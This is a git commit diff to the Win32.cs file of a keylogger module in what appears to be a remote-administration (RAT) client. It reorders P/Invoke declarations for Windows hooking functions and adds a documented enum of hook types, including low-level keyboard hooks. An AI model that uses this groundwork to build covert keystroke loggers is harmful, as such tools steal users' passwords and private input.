5d36ff44ac86b94dd2967536a3cdb26b8b2d1263
yankejustin <yankejustin@hotmail.com>
2015-05-19 17:32:55 -0400

    Added hook id type

--- Client/Core/Keylogger/Win32.cs
+++ Client/Core/Keylogger/Win32.cs
@@ -23,7 +23,16 @@ namespace xClient.Core.Keylogger
 
         [DllImport("user32.dll")]
         internal static extern short GetAsyncKeyState(KeyloggerKeys vKey);
-        
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall, SetLastError = true)]
+        internal static extern IntPtr SetWindowsHookEx(int hookID, Logger.HookProcDelegate callback, IntPtr hInstance, int threadID);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall, SetLastError = true)]
+        internal static extern bool UnhookWindowsHookEx(IntPtr hookHandle);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
+        internal static extern int CallNextHookEx(IntPtr hookHandle, int nCode, int wParam, ref Logger.KeyData lParam);
+
         // The value passed to GetAsyncKeyState is scan code, so we need to translate
         // the data to virtual code, then to unicode character, then we can log to
         // the file.
@@ -49,16 +58,111 @@ namespace xClient.Core.Keylogger
         [DllImport("kernel32.dll")]
         internal static extern IntPtr LoadLibrary(string lpFileName);
 
-        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall, SetLastError = true)]
-        internal static extern IntPtr SetWindowsHookEx(int hookID, Logger.HookProcDelegate callback, IntPtr hInstance, int threadID);
-
-        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall, SetLastError = true)]
-        internal static extern bool UnhookWindowsHookEx(IntPtr hookHandle);
-
-        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
-        internal static extern int CallNextHookEx(IntPtr hookHandle, int nCode, int wParam, ref Logger.KeyData lParam);
-
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         internal static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        #region Types
+
+        /// <summary>
+        /// Specifies the type of hook procedure to be installed.
+        /// </summary>
+        public enum idHook : int
+        {
+            /// <summary>
+            /// Installs a hook procedure that monitors messages before the
+            /// system sends them to the destination window procedure.
+            /// </summary>
+            WH_CALLWNDPROC = 4,
+
+            /// <summary>
+            /// Installs a hook procedure that monitors messages after
+            /// they have been processed by the destination window procedure.
+            /// </summary>
+            WH_CALLWNDPROCRET = 12,
+            /// <summary>
+            /// Installs a hook procedure that receives notifications useful
+            /// to a CBT application.
+            /// </summary>
+            WH_CBT = 5,
+
+            /// <summary>
+            /// Installs a hook procedure useful for debugging other hook
+            /// procedures.
+            /// </summary>
+            WH_DEBUG = 9,
+
+            /// <summary>
+            /// Installs a hook procedure that will be called when the
+            /// application's foreground thread is about to become idle.
+            /// This hook is useful for performing low priority tasks
+            /// during idle time.
+            /// </summary>
+            WH_FOREGROUNDIDLE = 11,
+
+            /// <summary>
+            /// Installs a hook procedure that monitors messages posted
+            /// to a message queue.
+            /// </summary>
+            WH_GETMESSAGE = 3,
+
+            /// <summary>
+            /// Installs a hook procedure that posts messages previously
+            /// recorded by a WH_JOURNALRECORD hook procedure.
+            /// </summary>
+            WH_JOURNALPLAYBACK = 1,
+
+            /// <summary>
+            /// Installs a hook procedure that records input messages
+            /// posted to the system message queue. This hook is useful
+            /// for recording macros.
+            /// </summary>
+            WH_JOURNALRECORD = 0,
+
+            /// <summary>
+            /// Installs a hook procedure that monitors keystroke messages.
+            /// </summary>
+            WH_KEYBOARD = 2,
+
+            /// <summary>
+            /// Installs a hook procedure that monitors low-level keyboard
+            /// input events.
+            /// </summary>
+            WH_KEYBOARD_LL = 13,
+
+            /// <summary>
+            /// Installs a hook procedure that monitors mouse messages
+            /// </summary>
+            WH_MOUSE = 7,
+
+            /// <summary>
+            /// Installs a hook procedure that monitors low-level mouse
+            /// input events.
+            /// </summary>
+            WH_MOUSE_LL = 14,
+
+            /// <summary>
+            /// Installs a hook procedure that monitors messages generated
+            /// as a result of an input event in a dialog box, message box,
+            /// menu, or scroll bar.
+            /// </summary>
+            WH_MSGFILTER = -1,
+
+            /// <summary>
+            /// Installs a hook procedure that receives notifications
+            /// useful to shell applications.
+            /// </summary>
+            WH_SHELL = 10,
+
+            /// <summary>
+            /// Installs a hook procedure that monitors messages generated
+            /// as a result of an input event in a dialog box, message box,
+            /// menu, or scroll bar. The hook procedure monitors these
+            /// messages for all applications in the same desktop as the
+            /// calling thread.
+            /// </summary>
+            WH_SYSMSGFILTER = 6
+        }
+
+        #endregion
     }
 }
